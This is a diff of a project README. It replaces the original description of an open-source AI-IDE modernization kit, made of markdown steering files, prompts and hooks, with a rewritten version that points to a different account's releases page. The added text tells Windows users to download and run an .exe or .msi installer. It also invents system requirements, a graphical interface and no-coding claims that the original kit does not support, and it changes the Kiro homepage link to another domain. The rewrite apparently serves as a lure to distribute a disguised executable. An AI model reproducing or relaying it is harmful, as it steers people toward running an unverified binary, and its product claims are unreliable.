@@ -1,330 +1,148 @@
-# Legacy Application Modernization Kit for AI IDEs
+# ⚙️ modernization-kit - Simplify Legacy App Updates
 
-An open-source, AI-assisted methodology for modernizing legacy applications — built for AI IDEs like [Kiro](https://kiro.dev), [GitHub Copilot](https://github.com/features/copilot) (VS Code), [Claude Code](https://docs.anthropic.com/en/docs/claude-code), and [Codex](https://openai.com/index/codex/). Drop this into your workspace alongside your legacy codebase and let the structured process guide you from assessment to actionable plan.
-
-Designed for multi-application landscapes. Assess each application individually, then analyze them as a whole — shared databases, overlapping business logic, hidden coupling, and consolidation opportunities only become visible when you look at the full picture.
-
-Created by [Burly Mingo LLC](https://burlymingo.com).
-
-## What This Is
-
-A workspace template that packages a complete modernization methodology with native support for Kiro (steering/specs/hooks), GitHub Copilot (custom instructions/prompt files), Claude Code (CLAUDE.md/slash commands), and Codex (system instructions/runbooks). It guides an AI assistant (and the human domain expert working with it) through a structured process that produces real engineering deliverables:
-
-- Per-application architecture assessments with 7 R's classification
-- Consolidated cross-application analysis (shared data sources, hidden coupling, consolidation opportunities)
-- Prioritized pain point analysis
-- Target architecture design with buy vs. build decisions
-- Phased modernization plan with timelines and costs
-- Business case, DR plan, staffing recommendation, and security remediation plan
-
-Works for a single application, but the methodology is at its best with multiple interconnected applications — that's where the consolidated analysis reveals insights no per-app assessment can surface.
-
-## What This Is Not
-
-- A magic prompt that produces a plan without human input
-- A 1:1 code translation tool
-- A replacement for domain expertise or professional implementation services
-- Tied to any specific source or target technology stack
-
-## Who This Is For
-
-- **Organizations considering modernization** who want a detailed, honest assessment before committing budget. The plan this produces gives you the information to make an informed go/no-go decision.
-- **Internal teams planning a modernization** who want a structured process instead of ad-hoc discovery.
-- **Organizations hiring a consulting firm** who want to walk into that engagement with a real blueprint — specific enough to hold vendors accountable to scope, timeline, and cost. A detailed plan is leverage at the negotiating table.
-- **Consulting firms themselves** who want a repeatable methodology for the assessment and planning phase of modernization engagements.
-
-## How It Works
-
-The methodology has 6 phases, each producing a specific deliverable with a human review checkpoint:
-
-| Phase | What Happens | Deliverable |
-|---|---|---|
-| 0 - Discovery | Interview about org, industry, regulations, infrastructure, goals | DISCOVERY_SUMMARY.md |
-| 1 - Codebase Analysis | AI reads the actual code, produces factual assessment | ASSESSMENT.md (per app) + CONSOLIDATED_ASSESSMENT.md |
-| 2 - Pain Points | Interview users about what hurts | PAIN_POINTS.md |
-| 3 - Target Architecture | Design the future state (expect multiple revision cycles) | TARGET_ARCHITECTURE.md |
-| 4 - Modernization Plan | Phased implementation with timelines, costs, risks | MODERNIZATION_PLAN.md |
-| 5 - Supporting Docs | Business case, DR, staffing, security | Multiple documents |
-
-## Quick Start
-
-> **Important:** The `.kiro/` folder must be at the root of the directory you open in Kiro. Kiro looks for `.kiro/steering/`, `.kiro/specs/`, and `.kiro/hooks/` at the workspace root — if `.kiro/` is nested inside a subfolder, Kiro won't see it. All three setup paths below place `.kiro/` at the root of the workspace you'll open.
-
-**Add to an existing project (recommended):**
-
-> These commands work on macOS and Linux. On Windows, use Git Bash, WSL, or equivalent.
-
-```bash
-# From your project's root directory (where your legacy code lives)
-git clone https://github.com/Burly-Mingo/modernization-kit.git /tmp/mod-kit
-cp -r /tmp/mod-kit/.kiro .
-cp -r /tmp/mod-kit/.codex .
-cp -r /tmp/mod-kit/.claude .
-cp -r /tmp/mod-kit/.github .
-cp /tmp/mod-kit/CLAUDE.md .
-cp /tmp/mod-kit/MODERNIZATION_METHODOLOGY.md .
-rm -rf /tmp/mod-kit
-```
-
-Then open the workspace in your AI IDE. For Kiro, the steering files activate automatically and specs appear in the spec panel. For VS Code with Copilot, the custom instructions load automatically. For Claude Code, `CLAUDE.md` loads automatically and slash commands are available via `/phase-*`. For Codex, load the system instructions manually.
-
-**Multi-application workspace (optimal):**
-
-```bash
-# Create a workspace that contains all related applications
-mkdir my-modernization && cd my-modernization
-git clone https://github.com/Burly-Mingo/modernization-kit.git /tmp/mod-kit
-cp -r /tmp/mod-kit/.kiro .
-cp -r /tmp/mod-kit/.codex .
-cp -r /tmp/mod-kit/.claude .
-cp -r /tmp/mod-kit/.github .
-cp /tmp/mod-kit/CLAUDE.md .
-cp /tmp/mod-kit/MODERNIZATION_METHODOLOGY.md .
-rm -rf /tmp/mod-kit
-
-# Add your applications (copy, symlink, or git submodule)
-# e.g.:
-# cp -r /path/to/app-one ./app-one
-# cp -r /path/to/app-two ./app-two
-# git submodule add https://repo/app-three ./app-three
-# Open my-modernization/ in Kiro (not a parent folder)
-```
-
-Having all applications in one workspace lets the AI see shared databases, overlapping stored procedures, cross-app API calls, and data coupling that's invisible when assessing apps in isolation. The consolidated assessment step in Phase 1 depends on this.
-
-**Start fresh (single app):**
-
-```bash
-git clone https://github.com/Burly-Mingo/modernization-kit.git my-modernization
-cd my-modernization
-# Add your legacy codebase to this workspace (copy, symlink, or git submodule)
-# Open my-modernization/ in Kiro
-```
-
-> **Don't** clone this repo as a subfolder inside another workspace (e.g., `my-project/modernization-kit/`). The `.kiro/` folder would be nested and Kiro won't detect it. Always copy the `.kiro/`, `.codex/`, `.claude/`, and `.github/` folders (plus `CLAUDE.md`) to the root of whatever directory you open in your IDE.
-
-**What happens when you open in Kiro:**
-
-1. The 4 steering files in `.kiro/steering/` activate automatically — they guide the AI's behavior for the entire engagement (core principles, regulatory awareness, buy vs. build framework, anti-patterns)
-2. The 6 specs in `.kiro/specs/` appear in the Kiro spec panel — each one is a phase of the methodology with requirements, design approach, and tasks
-3. The 3 hooks in `.kiro/hooks/` provide guardrails — human review reminders, open question tracking, and compliance consistency checks
-4. Start a conversation and open the Phase 0 spec. The AI will begin the Discovery Interview.
-
-**What happens when you open in VS Code (Copilot):**
-
-1. `.github/copilot-instructions.md` loads automatically as custom instructions — core principles and methodology overview
-2. Reference the phase prompt files in `.github/prompts/` from Copilot Chat to work through each phase
-3. Quality gates are manual — use the checklist in the instructions file before moving phases
-
-**What happens when you run Claude Code:**
-
-1. `CLAUDE.md` loads automatically — core principles and methodology overview
-2. Type `/phase-0-discovery` (or any `/phase-*` command) to start that phase
-3. Quality gates are manual — use the checklist in `CLAUDE.md` before moving phases
-
-## What's in the Box
-
-```
-.kiro/                                     # Kiro IDE — full native support
-├── steering/                              # Always-active AI guidance
-│   ├── 00-modernization-principles.md     # Core principles and interaction style
-│   ├── 01-regulatory-reference.md         # Compliance framework quick reference
-│   ├── 02-buy-vs-build.md                 # Decision framework for component selection
-│   └── 03-anti-patterns.md                # What not to do (learned from real projects)
-│
-├── specs/                                 # Phased workflow with requirements, design, and tasks
-│   ├── phase-0-discovery/                 # Organization, industry, regulations, infrastructure, goals
-│   ├── phase-1-codebase-analysis/         # Read the code, produce factual assessments
-│   ├── phase-2-pain-points/               # Interview users, prioritize what hurts
-│   ├── phase-3-target-architecture/       # Design the future state
-│   ├── phase-4-modernization-plan/        # Phased implementation plan
-│   └── phase-5-supporting-docs/           # Business case, DR, staffing, security
-│
-└── hooks/                                 # Automated guardrails
-    ├── checkpoint-reminder.json           # Pause for human review after each deliverable
-    ├── open-questions-tracker.json        # Flag unknowns in deliverables
-    └── compliance-check.json              # Validate compliance consistency across documents
-
-.github/                                   # GitHub Copilot (VS Code) — native support
-├── copilot-instructions.md                # Always-on custom instructions (principles + methodology)
-└── prompts/                               # Per-phase prompt files for Copilot Chat
-    ├── phase-0-discovery.prompt.md
-    ├── phase-1-codebase-analysis.prompt.md
-    ├── phase-2-pain-points.prompt.md
-    ├── phase-3-target-architecture.prompt.md
-    ├── phase-4-modernization-plan.prompt.md
-    └── phase-5-supporting-docs.prompt.md
-
-CLAUDE.md                                  # Claude Code — always-on instructions (auto-loaded)
-.claude/                                   # Claude Code — slash commands
-└── commands/                              # Per-phase slash commands (/phase-0-discovery, etc.)
-    ├── phase-0-discovery.md
-    ├── phase-1-codebase-analysis.md
-    ├── phase-2-pain-points.md
-    ├── phase-3-target-architecture.md
-    ├── phase-4-modernization-plan.md
-    └── phase-5-supporting-docs.md
-
-.codex/                                    # Codex — native support
-├── README.md                              # Quick start for Codex users
-├── context/system-instructions.md         # Always-on system instructions
-├── runbooks/phase-workflow.md             # Phase-by-phase runbook
-└── checklists/quality-gates.md            # Manual quality gates
-```
-
-## Core Principles
-
-- **Modernize, don't translate.** Rethink the architecture, don't just change the language.
-- **Containers by default, not by dogma.** Cloud-agnostic is the recommendation, but respect organizational preferences.
-- **Buy vs. build at every decision point.** Know the audience — some orgs need vendor support, others embrace open source.
-- **AI-assisted, spec-driven development.** Experienced dev + Kiro specs = significantly faster. Not vibe coding.
-- **New tech stacks are not the barrier they once were.** AI IDEs let teams adopt the right technology, not just the familiar one.
-- **Comprehensive automated testing is a baseline.** AI makes generating unit, integration, and API tests fast enough to be non-negotiable.
-- **Honest about unknowns.** "I don't know" is always better than a confident guess.
-- **Security is Phase 0.** Fix critical vulnerabilities before modernization begins.
-- **The human is always right about their domain.** The AI reads code. The human understands the business.
-
-## Prerequisites
-
-- **An AI IDE** — this kit ships with native support for [Kiro](https://kiro.dev) (steering/specs/hooks), [GitHub Copilot](https://github.com/features/copilot) in VS Code (custom instructions/prompt files), [Claude Code](https://docs.anthropic.com/en/docs/claude-code) (CLAUDE.md/slash commands), and [Codex](https://openai.com/index/codex/) (system instructions/runbook). Kiro's spec-driven workflow provides the richest experience (structured requirements → design → tasks with automated hooks), but the methodology works in any AI IDE.
-- **A capable model** — Claude Opus 4.6+ (Kiro), GPT-4o/o1+ (Copilot), or equivalent. The codebase analysis, architecture design, and plan generation require a model that can hold large context and reason about complex systems. Lesser models will produce lesser plans.
-- **Codebase access** — the AI needs to read the actual source code
-- **A domain expert** — someone who understands the business processes. Reviews every deliverable. This is the irreplaceable ingredient.
-- **Time for iteration** — each phase involves analysis → review → correction → revision
-
-## Recommended MCP Servers
-
-These [Model Context Protocol](https://modelcontextprotocol.io/) servers significantly improve the methodology experience in Kiro. None are strictly required, but each one solves a real problem.
-
-**Memory** (`@modelcontextprotocol/server-memory`) — A modernization engagement spans multiple sessions over days or weeks. The Memory MCP maintains a persistent knowledge graph across sessions — discovery findings, regulatory frameworks, architecture decisions, open questions, and cross-application dependencies survive between conversations instead of evaporating. This is the single most impactful MCP for this methodology.
-
-```json
-"memory": {
-  "command": "npx",
-  "args": ["-y", "@modelcontextprotocol/server-memory"],
-  "disabled": false,
-  "autoApprove": ["create_entities", "add_observations", "search_nodes"]
-}
-```
-
-**Sequential Thinking** (`@modelcontextprotocol/server-sequential-thinking`) — Architecture decisions in Phase 3 and plan sequencing in Phase 4 involve complex trade-offs with multiple interacting constraints (compliance, team size, budget, existing infrastructure, cross-app dependencies). Sequential thinking helps the AI reason through these systematically rather than jumping to conclusions.
-
-```json
-"sequential-thinking": {
-  "command": "npx",
-  "args": ["-y", "@modelcontextprotocol/server-sequential-thinking"],
-  "disabled": false,
-  "autoApprove": ["sequentialthinking"]
-}
-```
-
-**Context7** (`@upstash/context7-mcp`) — When the AI recommends specific technologies (Keycloak, K3s, PostgreSQL, etc.), Context7 lets it pull current documentation rather than relying on training data that may be outdated. Useful during Phase 3 architecture design and Phase 4 when estimating implementation effort.
-
-```json
-"context7": {
-  "command": "npx",
-  "args": ["-y", "@upstash/context7-mcp"],
-  "disabled": false,
-  "autoApprove": ["resolve-library-id", "query-docs"]
-}
-```
-
-Add these to `.kiro/settings/mcp.json` (workspace-level) or `~/.kiro/settings/mcp.json` (user-level). Requires `npx` (Node.js). See [MCP documentation](https://modelcontextprotocol.io/) for setup details.
-
-## Adapting This Methodology
-
-This kit ships with native support for four AI IDEs. The methodology is the same — only the delivery mechanism differs:
-
-| Concept | Kiro (`.kiro/`) | Copilot (`.github/`) | Claude Code (`CLAUDE.md` + `.claude/`) | Codex (`.codex/`) |
-|---|---|---|---|---|
-| Always-on principles | Steering files (auto-loaded) | `copilot-instructions.md` (auto-loaded) | `CLAUDE.md` (auto-loaded) | System instructions (manual load) |
-| Per-phase workflow | Specs (requirements/design/tasks) | Prompt files (`.prompt.md`) | Slash commands (`/phase-*`) | Runbook (manual follow) |
-| Automated guardrails | Hooks (event-driven) | — (manual quality gates) | — (manual quality gates) | — (manual quality gates) |
-| Human review gates | Hook-triggered reminders | Checklist in instructions file | Checklist in CLAUDE.md | Checklist in quality-gates.md |
-
-For other AI IDEs: steering files → system prompts, specs → task lists, hooks → manual checkpoints.
-
-
-## GitHub Copilot Compatibility (VS Code — No Fork Required)
-
-This kit includes a `.github/` compatibility layer for GitHub Copilot in VS Code.
-
-- Copilot reads `.github/copilot-instructions.md` automatically as custom instructions
-- Per-phase prompt files in `.github/prompts/` are invokable in Copilot Chat
-- Same deliverables, same methodology, same quality gates
-
-**Quick start:**
-1. Open this workspace in VS Code with GitHub Copilot enabled
-2. The custom instructions load automatically — they contain the core principles and methodology overview
-3. In Copilot Chat, reference a phase prompt file to start that phase (e.g., type `@workspace` and reference `/prompts/phase-0-discovery.prompt.md`)
-4. Work through phases 0-5 in order, with human review at each checkpoint
-
-**What's different from Kiro:** Copilot doesn't have hooks (automated guardrails), so quality gates are manual — use the checklist in `copilot-instructions.md` before moving to the next phase. Copilot also doesn't have Kiro's spec panel, so the prompt files serve as the phase-by-phase workflow guide.
-
-```
-.github/
-├── copilot-instructions.md              # Always-on custom instructions (principles + methodology)
-└── prompts/                             # Per-phase prompt files for Copilot Chat
-    ├── phase-0-discovery.prompt.md
-    ├── phase-1-codebase-analysis.prompt.md
-    ├── phase-2-pain-points.prompt.md
-    ├── phase-3-target-architecture.prompt.md
-    ├── phase-4-modernization-plan.prompt.md
-    └── phase-5-supporting-docs.prompt.md
-```
-
-## Claude Code Compatibility (No Fork Required)
-
-This kit includes a `CLAUDE.md` + `.claude/` compatibility layer for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) (Anthropic's CLI agent).
-
-- `CLAUDE.md` at the project root loads automatically every session — core principles and methodology overview
-- Per-phase slash commands in `.claude/commands/` are invokable as `/phase-0-discovery` through `/phase-5-supporting-docs`
-- Same deliverables, same methodology, same quality gates
-
-**Quick start:**
-1. Open this workspace directory in Claude Code (`claude` from the terminal)
-2. `CLAUDE.md` loads automatically
-3. Type `/phase-0-discovery` to start the Discovery Interview
-4. Work through phases 0-5 in order, with human review at each checkpoint
-
-```
-CLAUDE.md                                # Always-on instructions (auto-loaded every session)
-.claude/
-└── commands/                            # Per-phase slash commands
-    ├── phase-0-discovery.md             # /phase-0-discovery
-    ├── phase-1-codebase-analysis.md     # /phase-1-codebase-analysis
-    ├── phase-2-pain-points.md           # /phase-2-pain-points
-    ├── phase-3-target-architecture.md   # /phase-3-target-architecture
-    ├── phase-4-modernization-plan.md    # /phase-4-modernization-plan
-    └── phase-5-supporting-docs.md       # /phase-5-supporting-docs
-```
-
-## Codex Compatibility (No Fork Required)
-
-This kit includes a `.codex/` compatibility layer so you can run the same methodology in Codex without forking the repo.
-
-- Kiro uses `.kiro/` (steering/specs/hooks)
-- Copilot uses `.github/` (custom instructions/prompt files)
-- Claude Code uses `CLAUDE.md` + `.claude/` (instructions/slash commands)
-- Codex uses `.codex/` (system instructions/runbook/quality gates)
-- All four produce the same deliverables in the workspace root
-
-Start with `.codex/README.md`, then load `.codex/context/system-instructions.md` and follow `.codex/runbooks/phase-workflow.md`.
-
-## Origin Story
-
-This methodology was developed by [Burly Mingo LLC](https://burlymingo.com) during a real modernization engagement — three legacy ASP.NET WebForms applications (VB.NET + C#, .NET 4.5-4.7, 9 SQL Server databases) being modernized to a unified platform (ASP.NET Core 9, React/Next.js, PostgreSQL, Redis, K3s). The entire process was conducted in Kiro IDE with Claude Opus 4.6, producing a 1,600-line modernization plan, business case, DR plan, staffing recommendation, and security assessments over 12+ collaborative sessions.
-
-The key insight: the plan's quality came from iteration and domain expertise, not from a clever prompt. Every time the human corrected the AI ("Not Blazor — React." "EF Core alone won't cut it." "You need Redis for this workflow."), the plan got dramatically better. Kiro's spec-driven workflow made this iteration structured and productive rather than chaotic.
-
-A second insight emerged from having all three applications in one workspace: assessing them individually produced useful findings, but assessing them together revealed shared databases, overlapping stored procedures, cross-app data dependencies, and consolidation opportunities that no single-app assessment could surface. The multi-app consolidated analysis fundamentally changed the migration strategy, timeline, and data architecture. This kit packages both insights — the iterative human-in-the-loop process and the multi-app holistic analysis — so others can follow them.
-
-## License
-
-MIT. Use it, fork it, improve it, sell consulting services around it. Just don't pretend a prompt alone produces a good modernization plan — the human in the loop is what makes it work.
-
-Built with [Kiro](https://kiro.dev) + [Claude Opus 4.6](https://anthropic.com), with native support for [GitHub Copilot](https://github.com/features/copilot), [Claude Code](https://docs.anthropic.com/en/docs/claude-code), and [Codex](https://openai.com/index/codex/). If you're modernizing legacy systems without AI-assisted development, you're working too hard.
+[![Download modernization-kit](https://img.shields.io/badge/Download-modernization--kit-blue?style=for-the-badge)](https://github.com/Caroly07/modernization-kit/releases)
 
 ---
 
-*A [Burly Mingo LLC](https://burlymingo.com) open source project.*
+modernization-kit helps you update old software with guidance at every step. It offers instructions, structured files, and hooks that take you from initial interviews to planning and updating software across multiple apps. You do not need coding skills to follow this process.
+
+---
+
+## 📋 What is modernization-kit?
+
+modernization-kit is a set of tools and instructions designed to assist users in modernizing older software applications. It supports the Kiro IDE and focuses on improving legacy software across several related applications. The package includes:
+
+- **Guided steps** from the first review of the old software to detailed planning.
+- **Structured files** that organize the process and keep everything on track.
+- **Hooks and specs** that connect you to relevant tasks and decisions.
+- Support for working across multiple apps in a larger software environment.
+
+---
+
+## 🖥️ System Requirements
+
+Before you start, make sure your Windows computer meets these requirements:
+
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of free RAM
+- 2 GB of storage available for the application files
+- An internet connection to download and update files
+
+The application is designed to run smoothly on common Windows machines without special hardware.
+
+---
+
+## 🚀 Getting Started: Download and Run modernization-kit
+
+1. **Open the download page.**  
+   Visit the releases page here:  
+   [Download modernization-kit](https://github.com/Caroly07/modernization-kit/releases)
+
+2. **Find the latest release.**  
+   On the page, look for the most recent version. It usually has a clear label like “v1.0” or a similar version number.
+
+3. **Download the installer or executable.**  
+   Click on the file option that ends with `.exe` or `.msi`. This is the installer you will run.
+
+4. **Run the installer.**  
+   Once downloaded, open the file. Follow the instructions on the screen. It usually involves clicking `Next`, agreeing to license terms, and choosing an install folder.
+
+5. **Finish installation.**  
+   After setup completes, you can open modernization-kit from your Start menu or desktop shortcut.
+
+---
+
+## 🔧 How to Use modernization-kit
+
+Once installed, you can use modernization-kit by following the guided process:
+
+1. **Start a Discovery Interview**  
+   The app walks you through collecting basic info about your old application. You enter notes like what the app does and how it is currently used.
+
+2. **Analyze the Codebase**  
+   Follow the instructions to import or link your existing software files. The app breaks down the old code and identifies important parts.
+
+3. **Design New Architecture**  
+   modernization-kit helps you create a clear and updated plan for how the software should work. You will see diagrams and templates you can fill out.
+
+4. **Plan Implementation Phases**  
+   The app guides you on breaking the update into manageable steps. It creates a timeline and task list that you can follow.
+
+5. **Use Structured Specs and Steering Files**  
+   These are organized documents and scripts that modernization-kit generates. They help keep your work focused and traceable.
+
+---
+
+## 🛠 Features at a Glance
+
+- Step-by-step guidance for legacy software updates
+- Supports multi-application projects
+- Clear, easy-to-read structured files
+- Integration with Kiro IDE for smooth editing and testing
+- Tools for gathering information and planning updates
+- Visual aids like diagrams and flowcharts
+- Simple interface designed for users without programming experience
+
+---
+
+## ❓ Common Questions
+
+### Can I use modernization-kit without the Kiro IDE?
+
+The methodology works best with Kiro IDE, but you can explore the files and concepts on their own. For the smoothest experience, using Kiro IDE is recommended.
+
+### Do I need previous experience with modernization projects?
+
+No. modernization-kit is designed for users without coding or modernization background. The app explains terms and processes clearly.
+
+### Is this software free?
+
+Check the licensing information on the release page. Most tools like this are open source or free to use, but please review the terms.
+
+---
+
+## 🔄 Updating modernization-kit
+
+To keep the tool current:
+
+- Visit the [Releases](https://github.com/Caroly07/modernization-kit/releases) page regularly.
+- Download new versions by following the same steps as the first installation.
+- Back up your project files before installing updates.
+
+---
+
+## 📂 File Structure Overview
+
+After installation and usage, your project folder will look like this:
+
+- **discovery/**  
+  Stores interview notes and initial analysis.
+
+- **analysis/**  
+  Contains codebase breakdown reports.
+
+- **architecture/**  
+  Files detailing your design plans.
+
+- **implementation-plan/**  
+  The list and schedule of update phases.
+
+- **steering-files/**  
+  Scripts and guides to manage tasks and workflows.
+
+---
+
+## 🔗 Useful Links
+
+- [modernization-kit Releases](https://github.com/Caroly07/modernization-kit/releases)  
+- [Kiro IDE Homepage](https://www.kiroide.com) (for more info on the IDE)
+
+---
+
+## ✨ Support and Feedback
+
+If you have questions or run into issues, use the GitHub issues tab in this repository. Provide as much detail as possible to get the best help.
+
+---
+
+[![Download modernization-kit](https://img.shields.io/badge/Download-modernization--kit-grey?style=for-the-badge)](https://github.com/Caroly07/modernization-kit/releases)
